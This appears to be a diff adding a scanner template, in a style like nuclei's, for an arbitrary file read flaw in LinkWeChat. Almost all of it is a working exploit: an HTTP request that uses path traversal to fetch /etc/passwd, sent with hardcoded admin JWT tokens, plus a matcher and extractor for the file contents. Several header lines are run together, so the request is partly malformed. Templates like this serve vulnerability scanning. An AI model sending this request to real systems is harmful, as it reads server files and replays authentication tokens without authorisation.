@@ -1,0 +1,26 @@
+## id: VEID-2024-0301
+## name: LinkWeChat任意文件读取漏洞
+## author: hack007x
+## severity: high
+## tags: veid,file,veid2024
+## description:LinkWeChat任意文件读取漏洞
+## verification: true
+
+
+GET /linkwechat-api/common/download/resource?name=/profile/../../../../../etc/passwd HTTP/1.1
+Host: {{Hostname}}
+User-Agent: {{random_ua}}
+Cookie: Admin-Token=eyJhbGciOiJIUzUxMiJ9.eyJ1c2VyX3R5cGUiOiIwMyIsInVzZXJfaWQiOjE2OCwibG9naW5fdHlwZSI6IkxpbmtXZUNoYXRBUEkiLCJ1c2VyX25hbWUiOiJsdyIsInVzZXJfa2V5IjoiMGFmOWI2NGItZjMxMi00ZTQ1LTgzZTgtZjE4ODAzODkyNWQyIiwiY29ycF9uYW1lIjoi5Luf5b6u56eR5oqAIiwiY29ycF9pZCI6Ind3NjIyZmM4NTJmNzljM2YxMyJ9.XqbboaMctCUvviPeEwcMv7a2E3D288Prm9hQ2r8dizdadRaV4R-ldDXlYoHiitL-YfDq9V43CQ6TpMsc1MbH9QSec-Ch-Ua: "Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"Accept: application/json, text/plain, */*Sec-Ch-Ua-Mobile: ?0Authorization: Bearer eyJhbGciOiJIUzUxMiJ9.eyJ1c2VyX3R5cGUiOiIwMyIsInVzZXJfaWQiOjE2OCwibG9naW5fdHlwZSI6IkxpbmtXZUNoYXRBUEkiLCJ1c2VyX25hbWUiOiJsdyIsInVzZXJfa2V5IjoiMGFmOWI2NGItZjMxMi00ZTQ1LTgzZTgtZjE4ODAzODkyNWQyIiwiY29ycF9uYW1lIjoi5Luf5b6u56eR5oqAIiwiY29ycF9pZCI6Ind3NjIyZmM4NTJmNzljM2YxMyJ9.XqbboaMctCUvviPeEwcMv7a2E3D288Prm9hQ2r8dizdadRaV4R-ldDXlYoHiitL-YfDq9V43CQ6TpMsc1MbH9Q
+Referer: {{Hostname}}
+X-Forwarded-For: {{Hostname}}
+
+
+#@ condition: and
+#@ matcher: body matches /root:[^:]*:[0-9]+:[0-9]+:/
+#> extract: name=etc_passwd, from=body, regex=/(root:[^:]*:[0-9]+:[0-9]+:[^:]*:[^:]*:\/[^\n]+)/, group=1
+
+
+
+
+
+# @VEIL-STAMP: 95929f3f336e3389f48572edf40486703455179753acbb11588c2427685f65a4
